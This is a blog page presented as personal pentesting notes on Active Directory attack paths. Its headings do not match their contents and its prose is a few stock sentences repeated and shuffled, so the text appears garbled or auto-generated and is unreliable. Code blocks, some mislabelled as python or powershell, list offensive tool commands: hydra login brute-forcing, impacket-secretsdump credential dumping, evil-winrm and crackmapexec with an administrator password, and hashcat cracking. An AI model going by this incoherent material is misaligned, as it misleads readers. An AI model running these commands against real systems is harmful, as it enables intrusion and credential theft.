---
TitleSEO: "Active Directory Attack Paths | ZureFX"
TitlePost: "Active Directory Attack Paths"
Author: "ZureFX"
Description: "Personal notes on Active Directory Attack Paths. Quick reference for pentesting and CTF challenges."
Keywords: "cheatsheet, enumeration, malware"
URL: "https://zurefx.github.io/notes/note-active-directory-attack-paths-717.html"
URL_IMAGES: ""
Date: "2024-05-13"
Tags: "Cheatsheet, Enumeration, Malware"
Section: "notes"
Lang: "en"
main_img: "note-active-directory-attack-paths-717"
Permalink: "/notes/note-active-directory-attack-paths-717.html"
BtnLabel: "Read Notes"
Pick: 0
---
## CORS Misconfiguration

### chisel

- `secretsdump`
- `NTLM Relay`
- `kerbrute`
- `smbclient`
- `Docker Escape`
- `dcomexec`

The scheduled task ran with elevated privileges and could be abused for escalation. Token impersonation allowed elevation to SYSTEM privileges on the target. The target system was identified as running a vulnerable version of the service.

```python
gobuster dir -u http://10.14.164.225/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.108.230.92/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

> **Note:** Command Injection was identified as the primary attack vector in this scenario.

> **Note:** SSRF was identified as the primary attack vector in this scenario.

## bloodhound

### DNS

Authentication bypass was achieved through careful manipulation of the login mechanism. Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

```python
feroxbuster -h
nmap -sCV -p5986,445,445 10.125.90.233 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.112.58.15 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.68.86.116 -u administrator -p 'P@ssw0rd!'
```

```bash
nmap -sCV -p9200,587,8080 10.73.129.209 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.96.114.48
crackmapexec smb 10.21.99.114 -u administrator -p 'P@ssw0rd!' --shares
```

## Ruby on Rails

### feroxbuster

Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service. Command injection was possible through unsanitized user input in the search functionality. Unconstrained delegation was enabled on the compromised machine.

> **Note:** NFS No Root Squash was identified as the primary attack vector in this scenario.

```bash
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.129.245.8 -u administrator -p 'P@ssw0rd!'
```

## GetUserSPNs

### XSS

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.33.133.113 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.72.69.242
```

- `netcat`
- `rubeus`
- `hashcat`
- `AlwaysInstallElevated`

Unconstrained delegation was enabled on the compromised machine. Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism.

## ligolo-ng

### smbexec

Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory. Group Policy Preferences contained encrypted but recoverable credentials.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.26.210.217 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.82.67.192 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

## NFS No Root Squash

### LAPS Abuse

The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service. Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities.

The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions. Post-exploitation enumeration revealed a path to domain administrator privileges.
